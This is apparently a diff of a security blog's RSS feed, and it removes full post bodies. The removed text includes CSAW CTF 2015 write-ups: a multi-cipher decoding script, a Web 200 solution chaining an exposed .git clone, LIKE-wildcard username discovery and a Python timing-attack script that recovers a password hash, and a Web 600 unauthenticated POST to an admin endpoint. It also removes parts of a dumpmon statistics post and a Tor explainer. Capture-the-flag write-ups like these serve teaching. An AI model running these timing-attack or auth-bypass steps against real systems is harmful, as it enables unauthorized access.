-import random
-from base64 import b64encode, b64decode
-
-FLAG = &#39;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&#39;
-
-enc_ciphers = [&#39;rot13&#39;, &#39;b64e&#39;, &#39;caesar&#39;]
-# dec_ciphers = [&#39;rot13&#39;, &#39;b64d&#39;, &#39;caesard&#39;]
-
-def rot13(s):
-    _rot13 = string.maketrans( 
-    &amp;quot;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&amp;quot;, 
-    &amp;quot;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&amp;quot;)
-    return string.translate(s, _rot13)
-
-def b64e(s):
-    return b64encode(s)
-
-def caesar(plaintext, shift=3):
-    alphabet = string.ascii_lowercase
-    shifted_alphabet = alphabet[shift:] + alphabet[:shift]
-    table = string.maketrans(alphabet, shifted_alphabet)
-    return plaintext.translate(table)
-
-def encode(pt, cnt=50):
-    tmp = &#39;2{}&#39;.format(b64encode(pt))
-    for cnt in xrange(cnt):
-        c = random.choice(enc_ciphers)
-        i = enc_ciphers.index(c) + 1
-        _tmp = globals()[c](tmp)
-        tmp = &#39;{}{}&#39;.format(i, _tmp)
-
-    return tmp
-
-if __name__ == &#39;__main__&#39;:
-    print encode(FLAG, cnt=?)
-
-2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWm&amp;lt;snip&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We see that there are three different encryption/encoding routines available - base64 encoding, a caesar cipher, and a rot13 function. Let&amp;rsquo;s dissect the &lt;code&gt;encode&lt;/code&gt; function to see if we can figure out what&amp;rsquo;s going on with the input.&lt;/p&gt;
-
-&lt;p&gt;It looks like we start off by base64 encoding the input and prepending &amp;ldquo;2&amp;rdquo; to it. Then, as many times as specified (the default is 50), we choose a random function and run it on the current input.&lt;/p&gt;
-
-&lt;p&gt;The important line in our reversal is &lt;code&gt;tmp = &#39;{}{}&#39;.format(i, _tmp)&lt;/code&gt;. This line prepends the &lt;em&gt;output&lt;/em&gt; of the function chosen with the function&amp;rsquo;s &lt;em&gt;index in enc_ciphers + 1&lt;/em&gt;. This makes sense, as the index + 1 of the base64 encode function is 2, and that&amp;rsquo;s exactly what we prepend to the initial input before base64 encoding it.&lt;/p&gt;
-
-&lt;p&gt;So, in a nutshell here are the corresponding keys:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;1 - rot13&lt;/li&gt;
-&lt;li&gt;2 - base64 encode&lt;/li&gt;
-&lt;li&gt;3 - caesar cipher&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;All we have to do to get the original flag is to reverse this process. We have to start by creating the inverse of our functions. Rot13 is its own inverse, and for Caesar cipher we can just change &lt;code&gt;shift=3&lt;/code&gt; to &lt;code&gt;shift=-3&lt;/code&gt;. Then, we only have to add the following base64 decode function:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def b64d(s):
-    return b64decode(s)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Finally, we just need to put the pieces together to do the reversing. I used the following &lt;code&gt;decode&lt;/code&gt; and &lt;code&gt;main&lt;/code&gt; functions:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def decode(pt):
-	while &amp;quot;flag&amp;quot; not in pt:
-		i = int(pt[0])
-		raw = pt[1:]
-		print &amp;quot;Running function &amp;quot; + dec_ciphers[i-1]
-		_pt = globals()[dec_ciphers[i-1]](raw)
-		pt = _pt
-	print pt
-
-if __name__ == &#39;__main__&#39;:
-	with open(&#39;csaw_data.txt&#39;, &#39;r&#39;) as raw:
-		print decode(raw.read().strip())
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This gives us the following output:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Running function b64d
-Running function b64d
-Running function caesard
-Running function b64d
-Running function b64d
-Running function b64d
-Running function b64d
-Running function rot13
-Running function b64d
-Running function caesard
-Running function caesard
-Running function caesard
-Running function rot13
-Running function rot13
-Running function rot13
-Running function b64d
-Running function rot13
-Running function rot13
-Running function rot13
-Running function b64d
-Running function caesard
-Running function caesard
-Running function rot13
-Running function b64d
-Running function caesard
-Running function caesard
-Running function caesard
-Running function b64d
-Running function b64d
-Running function b64d
-Running function b64d
-Running function b64d
-Running function caesard
-Running function b64d
-Running function rot13
-Running function rot13
-Running function caesard
-Running function caesard
-Running function caesard
-Running function caesard
-Running function caesard
-Running function caesard
-Running function caesard
-Running function caesard
-Running function b64d
-Running function b64d
-Running function caesard
-Running function caesard
-Running function caesard
-Running function b64d
-Running function rot13
-Running function caesard
-Running function b64d
-Running function caesard
-Running function b64d
-Running function rot13
-Running function caesard
-Running function rot13
-Running function caesard
-Running function caesard
-Running function b64d
-flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;There&amp;rsquo;s the flag! &lt;code&gt;flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/csaw2015/frame_contains.png&#34;&gt;&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -884,214 +183,9 @@ flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}
       <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/csaw_200.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
-&lt;p&gt;Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a &amp;ldquo;Lawn Care Simulator 2015&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a &amp;ldquo;Lawn Care Simulator 2015&amp;rdquo;.
 
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/csaw2015/lawn_care.png&#34;&gt;&lt;/p&gt;
-
-&lt;p&gt;We can immediately see there&amp;rsquo;s a sign in form, which might prove useful later. But before we get too far into that, let&amp;rsquo;s view the page source. Opening up the source, we see the following javascript snippet:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function init(){
-            document.getElementById(&#39;login_form&#39;).onsubmit = function() {
-                var pass_field = document.getElementById(&#39;password&#39;); 
-                pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
-        };
-        $.ajax(&#39;.git/refs/heads/master&#39;).done(function(version){$(&#39;#version&#39;).html(&#39;Version: &#39; +  version.substring (0,6))});
-        initGrass();
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;You&amp;rsquo;ll notice that there&amp;rsquo;s an ajax call being made to a &lt;code&gt;.git&lt;/code&gt; directory. If this is a full Git repo, we should be able to clone it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
-jordan@temp:~$ ls web200
-___HINT___  jobs.html  premium.php  validate_pass.php
-index.html  js         sign_up.php
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;em&gt;Nice!&lt;/em&gt; Now we can dive into the PHP. The &lt;code&gt;__HINT__&lt;/code&gt; didn&amp;rsquo;t prove to useful to me, but maybe I just didn&amp;rsquo;t &lt;em&gt;get&lt;/em&gt; it. Let&amp;rsquo;s get started by looking at the relevant parts of &lt;code&gt;premium.php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-    require_once &#39;validate_pass.php&#39;;
-    require_once &#39;flag.php&#39;;
-    if (isset($_POST[&#39;password&#39;]) &amp;amp;&amp;amp; isset($_POST[&#39;username&#39;])) {
-        $auth = validate($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);
-        if ($auth){
-            echo &amp;quot;&amp;lt;h1&amp;gt;&amp;quot; . $flag . &amp;quot;&amp;lt;/h1&amp;gt;&amp;quot;;
-        }
-        else {
-            echo &amp;quot;&amp;lt;h1&amp;gt;Not Authorized&amp;lt;/h1&amp;gt;&amp;quot;;
-        }
-    }
-    else {
-        echo &amp;quot;&amp;lt;h1&amp;gt;You must supply a username and password&amp;lt;/h1&amp;gt;&amp;quot;;
-    }
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It looks like our flag is found in &lt;code&gt;flag.php&lt;/code&gt;. Unfortunately, we don&amp;rsquo;t have that file, but it looks like &lt;code&gt;$flag&lt;/code&gt; is printed if we authenticate correctly.&lt;/p&gt;
-
-&lt;p&gt;The authentication is handled by the &lt;code&gt;validate(username, password)&lt;/code&gt; function in &lt;code&gt;validate_pass.php&lt;/code&gt;. Let&amp;rsquo;s see what it looks like:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-    &amp;lt;snip&amp;gt;
-    $user = mysql_real_escape_string($user);
-    $query = &amp;quot;SELECT hash FROM users WHERE username=&#39;$user&#39;;&amp;quot;;
-    $result = mysql_query($query) or die(&#39;Query failed: &#39; . mysql_error());
-    $line = mysql_fetch_row($result, MYSQL_ASSOC);
-    $hash = $line[&#39;hash&#39;];
-
-    if (strlen($pass) != strlen($hash))
-        return False;
-
-    $index = 0;
-    while($hash[$index]){
-        if ($pass[$index] != $hash[$index])
-            return false;
-        # Protect against brute force attacks
-        usleep(300000);
-        $index+=1;
-    }
-    return true;
-    &amp;lt;snip&amp;gt;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.&lt;/p&gt;
-
-&lt;p&gt;We&amp;rsquo;ll get back to the password comparison later. First, how do we get the username? We have one more file, &lt;code&gt;sign_up.php&lt;/code&gt; that might help. Let&amp;rsquo;s take a look:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-    &amp;lt;snip&amp;gt;
-    $user = mysql_real_escape_string($_POST[&#39;username&#39;]);
-    // check to see if the username is available
-    $query = &amp;quot;SELECT username FROM users WHERE username LIKE &#39;$user&#39;;&amp;quot;;
-    $result = mysql_query($query) or die(&#39;Query failed: &#39; . mysql_error());
-    $line = mysql_fetch_row($result, MYSQL_ASSOC);
-    if ($line == NULL){
-        // Signing up for premium is still in development
-        echo &#39;&amp;lt;h2 style=&amp;quot;margin: 60px;&amp;quot;&amp;gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&amp;lt;/h2&amp;gt;&#39;;
-    }
-    else {
-        echo &#39;&amp;lt;h2 style=&amp;quot;margin: 60px;&amp;quot;&amp;gt;Username: &#39; . $line[&#39;username&#39;] . &amp;quot; is not available&amp;lt;/h2&amp;gt;&amp;quot;;
-    }
-    &amp;lt;snip&amp;gt;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This function tries to look up the username given and, if it exists, will tell us the username isn&amp;rsquo;t available. We could try guessing (I did), but that doesn&amp;rsquo;t help. Let&amp;rsquo;s look more closely at the code.&lt;/p&gt;
-
-&lt;p&gt;The SQL statement is done via a &lt;code&gt;LIKE&lt;/code&gt; condition. This allows us to use the &lt;code&gt;%&lt;/code&gt; character as a wildcard. So, by trying the username &lt;code&gt;%&lt;/code&gt;, we should get the username from the database.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/csaw2015/username.png&#34;&gt;&lt;/p&gt;
-
-&lt;p&gt;Awesome - our username is &lt;code&gt;~~FLAG~~&lt;/code&gt;. Now we need to find the password.&lt;/p&gt;
-
-&lt;p&gt;Going back to the code given in &lt;code&gt;validate_pass.php&lt;/code&gt;, we see the following comparison&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    while($hash[$index]){
-        if ($pass[$index] != $hash[$index])
-            return false;
-        # Protect against brute force attacks
-        usleep(300000);
-        $index+=1;
-    }
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a &lt;code&gt;usleep(300000)&lt;/code&gt;, which is .3 seconds. This means that, if we check every character, one will take longer. This is a &lt;strong&gt;timing attack&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;import time
-import requests
-
-data = {
-	&amp;quot;username&amp;quot; : &amp;quot;~~FLAG~~&amp;quot;,
-	&amp;quot;password&amp;quot; : &amp;quot;&amp;quot;
-}
-
-url = &amp;quot;http://54.175.3.248:8089/premium.php&amp;quot;
-
-password = [&#39;a&#39;]*32 
-
-def send_request(password):
-	data[&amp;quot;password&amp;quot;] = password
-	start = time.time()
-	requests.post(url, data=data)
-	end = time.time()
-	return end - start	
-
-hex = &amp;quot;0123456789abcdef&amp;quot;
-
-for i in range(32):
-	max_time = 0
-	char = &amp;quot;&amp;quot;
-	index = 0
-	for j in hex:
-		temp_pass = password
-		temp_pass[i] = j
-		request_time = send_request(&amp;quot;&amp;quot;.join(temp_pass))
-		if request_time &amp;gt;= max_time:
-			index = i
-			max_time = request_time
-			char = j
-	password[index] = char	
-	print &amp;quot;&amp;quot;.join(password)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-667e2aaaaaaaaaaaaaaaaaaaaaaaaaaa
-667e21aaaaaaaaaaaaaaaaaaaaaaaaaa
-667e217aaaaaaaaaaaaaaaaaaaaaaaaa
-667e2176aaaaaaaaaaaaaaaaaaaaaaaa
-667e21766aaaaaaaaaaaaaaaaaaaaaaa
-667e217666aaaaaaaaaaaaaaaaaaaaaa
-667e217666aaaaaaaaaaaaaaaaaaaaaa
-667e217666a1aaaaaaaaaaaaaaaaaaaa
-667e217666a13aaaaaaaaaaaaaaaaaaa
-667e217666a13daaaaaaaaaaaaaaaaaa
-667e217666a13d3aaaaaaaaaaaaaaaaa
-667e217666a13d39aaaaaaaaaaaaaaaa
-667e217666a13d39aaaaaaaaaaaaaaaa
-667e217666a13d39a0aaaaaaaaaaaaaa
-667e217666a13d39a02aaaaaaaaaaaaa
-667e217666a13d39a023aaaaaaaaaaaa
-667e217666a13d39a0239aaaaaaaaaaa
-667e217666a13d39a02399aaaaaaaaaa
-667e217666a13d39a023995aaaaaaaaa
-667e217666a13d39a0239951aaaaaaaa
-667e217666a13d39a0239951eaaaaaaa
-667e217666a13d39a0239951efaaaaaa
-667e217666a13d39a0239951efeaaaaa
-667e217666a13d39a0239951efe2aaaa
-667e217666a13d39a0239951efe2daaa
-667e217666a13d39a0239951efe2deaa
-667e217666a13d39a0239951efe2de4a
-667e217666a13d39a0239951efe2de48
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now, all that&amp;rsquo;s left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$.post(&#39;premium.php&#39;, {&amp;quot;username&amp;quot;: &amp;quot;~~FLAG~~&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;667e217666a13d39a0239951efe2de48&amp;quot;}).success(function(data){console.log(data)})
-&amp;lt;head&amp;gt;
-    &amp;lt;title&amp;gt;Lawn Care Simulator 2015&amp;lt;/title&amp;gt;
-    &amp;lt;script src=&amp;quot;//code.jquery.com/jquery-1.11.3.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
-    &amp;lt;script src=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
-    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&amp;quot;&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-&amp;lt;h1&amp;gt;flag{gr0wth__h4ck!nG!1!1!&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And there we have the flag: &lt;code&gt;flag{gr0wth__h4ck!nG!1!1!}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/csaw2015/lawn_care.png&#34;&gt;&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1100,25 +194,7 @@ for i in range(32):
       <pubDate>Sun, 20 Sep 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-600-writeup/</guid>
-      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/csaw_600.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
-
-
-&lt;p&gt;This one was surprisingly easy if you knew where to look.&lt;/p&gt;
-
-&lt;p&gt;For this challenge, we were presented with a hint that indicated there was a vulnerability in the code used to run the CSAW CTF. I remember seeing a while back that the platform was &lt;a href=&#34;https://github.com/isislab/CTFd&#34;&gt;open-sourced&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;When looking for bugs in open-source projects, both Issues and Commits are good places to start out. In this case, we see &lt;a href=&#34;https://github.com/isislab/CTFd/commit/9578355143d7af675fc4776b0f2de802be91e261&#34;&gt;a commit&lt;/a&gt; recently made with the message &amp;ldquo;Fix authentication for certain admin actions&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;The &lt;code&gt;/admin/chal/new&lt;/code&gt; function would be pretty dangerous since it might allow us to upload a file. Let&amp;rsquo;s see what happens if we make a POST to that endpoint:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;jordan@temp:~$ curl https://ctf.isis.poly.edu/admin/chal/new -XPOST
-flag{at_least_it_isnt_php}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Easy enough.&lt;/p&gt;
-
-&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/csaw_600.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;</description>
     </item>
     
     <item>
@@ -1127,9 +203,7 @@ flag{at_least_it_isnt_php}
       <pubDate>Tue, 26 May 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/05/26/two-years-of-at-dumpmon/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/dumpmon_header.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/dumpmon_header.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
@@ -1140,95 +214,8 @@ flag{at_least_it_isnt_php}
 
 &lt;p&gt;After two years, it&amp;rsquo;s time to post an overdue status update providing some insight into the data dumpmon has collected over this time.&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Note: This is a pretty long post, so feel free to skip &lt;a href=&#34;#data&#34;&gt;here&lt;/a&gt; if you just want the data.&lt;/em&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;collecting-the-data-mongo-elk&#34;&gt;Collecting the Data: Mongo + ELK&lt;/h3&gt;
-
-&lt;p&gt;Soon after dumpmon went live, I noticed that sensitive pastes were getting deleting shortly after being posted. This makes it difficult to use the data for any long term research, so I started keeping copies.&lt;/p&gt;
-
-&lt;p&gt;First, I used MongoDB to store each paste and meta information (such as &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;num_emails&lt;/code&gt;, &lt;code&gt;num_hashes&lt;/code&gt;, etc.). This worked well for about a year, but it put quite a bit of strain on my Raspberry Pi. Additionally, it was cumbersome to query the data and visualize the statistics over time.&lt;/p&gt;
-
-&lt;p&gt;I decided to move everything over to ELK. Unfortunately, in the process of doing so, the DB got corrupted causing most of the data to be lost. &lt;em&gt;Not a good day.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;However, I eventually got everything up and running with copies of the data going to both MongoDB (just in case), as well as ELK. Here&amp;rsquo;s a partial screenshot of the dashboard:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/dumpmon_report/dashboard.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;Having this dashboard in ELK lets me see trends over time, search for individual paste content, as well as track pastes related to a campaign over time.&lt;/p&gt;
-
-&lt;h3 id=&#34;analyzing-the-data&#34;&gt;Analyzing the Data&lt;/h3&gt;
-
-&lt;p&gt;Enough history - let&amp;rsquo;s take a look at the data!&lt;/p&gt;
-
-&lt;p&gt;As mentioned before, most of the older data was lost in the process of migrating to ELK, but we still have data dating back to June 2014 to analyze.&lt;/p&gt;
-
-&lt;p&gt;Let&amp;rsquo;s first talk about the overall kinds of data kinds of data found. Currently, dumpmon looks for database dumps, Cisco config files, Google API keys, and SSH private keys. Overwhemingly, database dumps are the most common type of paste found, coming in at 92%.&lt;/p&gt;
-
-&lt;p&gt;Each of these database dumps can contain a combination of usernames, email addresses, passwords (plain text or hashed), and more.&lt;/p&gt;
-
-&lt;p&gt;After a few weeks of running the bot, is was clear that password dumps occur far more often than I thought. On average, &lt;strong&gt;dumpmon found 46 significant (by its thresholds) database dumps every day.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;cumulative-results&#34;&gt;Cumulative Results&lt;/h4&gt;
-
-&lt;p&gt;Here are a few more cumulative numbers for those interested:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;32.8k potential database dumps total&lt;/li&gt;
-&lt;li&gt;540 emails, on average, per dump (since June)&lt;/li&gt;
-&lt;li&gt;5 million unique emails found (since June)&lt;/li&gt;
-&lt;li&gt;1 million unique hashes found (since June)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&#34;twitter-account-statistics&#34;&gt;Twitter Account Statistics&lt;/h3&gt;
-
-&lt;p&gt;Thanks to the Twitter Analytics platform, we can get insight into the statistics regarding the actual dumpmon Twitter account.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/dumpmon_report/twitter_followers.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see above, the number of followers has steadily increased over time. While Twitter won&amp;rsquo;t give me trends for the entire time dumpmon has been running, here is some data for the last 28 days:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/blog/dumpmon_report/general_stats.png&#34;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;div id=&#34;data&#34;&gt;&lt;/div&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;here-have-some-data&#34;&gt;Here, Have Some Data&lt;/h3&gt;
-
-&lt;p&gt;I&amp;rsquo;m a big fan of giving out raw data. While I have hesitations to release all the raw data dumpmon has found (&lt;a href=&#34;https://jordan-wright.com/blog/contact&#34;&gt;contact&lt;/a&gt; me if you&amp;rsquo;re a researcher who needs this data), I&amp;rsquo;m happy to give out all of the information I have about dumpmon&amp;rsquo;s Twitter activity. This includes dumpmon&amp;rsquo;s entire tweet archive, aggregated analytics data, and more.&lt;/p&gt;
-
-&lt;p&gt;&lt;img style=&#34;vertical-align:middle;&#34; src=&#34;https://jordan-wright.com/blog/blog/images/blog/dumpmon_report/zip.png&#34;/&gt;
-&lt;strong&gt;Tweet Archive&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/downloads/dumpmon_archive.zip&#34;&gt;This&lt;/a&gt; is dumpmon&amp;rsquo;s exported Twitter archive. It contains &lt;strong&gt;every tweet&lt;/strong&gt; sent out by dumpmon. You should use this data if you want to extract out metrics regarding number of emails per dump, etc.&lt;/p&gt;
-
-&lt;p&gt;Specifically, the &lt;code&gt;tweets.csv&lt;/code&gt; file in this archive contains the following fields:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;tweet_id, in_reply_to_status_id, in_reply_to_user_id, timestamp, source, text, retweeted_status_id, retweeted_status_user_id, retweeted_status_timestamp, expanded_urls
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/downloads/dumpmon_archive.zip&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img style=&#34;vertical-align:middle;&#34; src=&#34;https://jordan-wright.com/blog/blog/images/blog/dumpmon_report/analytics.png&#34;/&gt;
-&lt;strong&gt;Tweet Analytics&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/downloads/tweet_activity_metrics_dumpmon.csv&#34;&gt;This file&lt;/a&gt; contains the analytics of every tweet after 04/30/2014 (22k tweets). It&amp;rsquo;s in CSV format and has the following fields:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Tweet id, Tweet permalink, Tweet text, time, impressions, engagements, engagement rate, retweets, replies, favorites, user profile clicks, url clicks, hashtag clicks, detail expands, permalink clicks
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://jordan-wright.com/blog/downloads/tweet_activity_metrics_dumpmon.csv&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
-
-&lt;p&gt;I hope this post gave a long-overdue update of where dumpmon is today. I recently moved dumpmon to a new home on a Digital Ocean VPS that&amp;rsquo;s bigger, faster, and has more storage than my Pi.&lt;/p&gt;
-
-&lt;p&gt;It should be noted that dumpmon is just getting started. While there haven&amp;rsquo;t been too many changes to the codebase in a while, I&amp;rsquo;ve seen people expanding the codebase in ways I&amp;rsquo;m excited to bring mainline.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;All in all, @dumpmon is here to stay.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;As always, please don&amp;rsquo;t hesitate to let me know if you have any questions or comments!&lt;/p&gt;
-
-&lt;p&gt;-Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
-</description>
+&lt;p&gt;&lt;em&gt;Note: This is a pretty long post, so feel free to skip &lt;a href=&#34;#data&#34;&gt;here&lt;/a&gt; if you just want the data.&lt;/em&gt;
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1237,71 +224,15 @@ flag{at_least_it_isnt_php}
       <pubDate>Thu, 14 May 2015 00:00:00 +0000</pubDate>
       
       <guid>https://jordan-wright.com/blog/2015/05/14/how-tor-works-part-three-the-consensus/</guid>
-      <description>
-
-&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/how_tor_works_2.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/how_tor_works_2.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
 
 &lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;Welcome to the third post in my series on how Tor works! In the &lt;a href=&#34;https://jordan-wright.com/blog/blog/categories/tor/&#34;&gt;past two posts&lt;/a&gt;, we talked about how clients tunnel traffic through relays, as well as introduced the idea of unpublished relays called bridges.&lt;/p&gt;
 
-&lt;p&gt;But how do clients know what relays are active? How is the Tor network actually organized and maintained? This post will answer this question by talking about a living document called the &lt;strong&gt;consensus&lt;/strong&gt; as well as introducing a few very important Tor nodes that run the show behind the scenes.&lt;/p&gt;
-
-&lt;h3 id=&#34;respect-my-authoritah&#34;&gt;Respect My Authoritah&lt;/h3&gt;
-
-&lt;p&gt;In the last post, we mentioned that there is a master list of Tor relays as well as a master list of Tor bridges. Before talking about &lt;em&gt;how&lt;/em&gt; this list is maintained, we need to talk about &lt;em&gt;who&lt;/em&gt; maintains it.&lt;/p&gt;
-
